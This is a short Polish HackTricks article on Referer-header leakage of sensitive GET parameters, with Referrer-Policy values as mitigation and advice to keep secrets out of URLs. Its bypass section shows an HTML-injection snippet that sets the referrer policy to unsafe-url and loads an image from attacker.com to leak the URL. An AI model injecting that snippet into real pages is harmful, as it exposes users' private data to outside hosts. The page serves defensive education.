{% hint style="success" %}
Ucz się i praktykuj Hacking AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i praktykuj Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostępniaj sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
{% endhint %}


# Nagłówki odwołań i polityka

Referrer to nagłówek używany przez przeglądarki do wskazania, która była poprzednia odwiedzona strona.

## Wyciek wrażliwych informacji

Jeśli w pewnym momencie wewnątrz strony internetowej znajdują się jakiekolwiek wrażliwe informacje w parametrach żądania GET, jeśli strona zawiera linki do zewnętrznych źródeł lub atakujący jest w stanie sprawić/zasugerować (inżynieria społeczna), aby użytkownik odwiedził adres URL kontrolowany przez atakującego. Mógłby on wydobyć wrażliwe informacje z ostatniego żądania GET.

## Ograniczenie

Możesz sprawić, aby przeglądarka stosowała **politykę odwołań** (**Referrer-policy**), która mogłaby **zapobiec** wysyłaniu wrażliwych informacji do innych aplikacji internetowych:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Przeciwdziałanie

Możesz zastąpić tę regułę, używając tagu meta HTML (atakujący musi wykorzystać wstrzyknięcie HTML):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Obrona

Nigdy nie umieszczaj żadnych danych poufnych w parametrach GET ani ścieżkach w adresie URL.
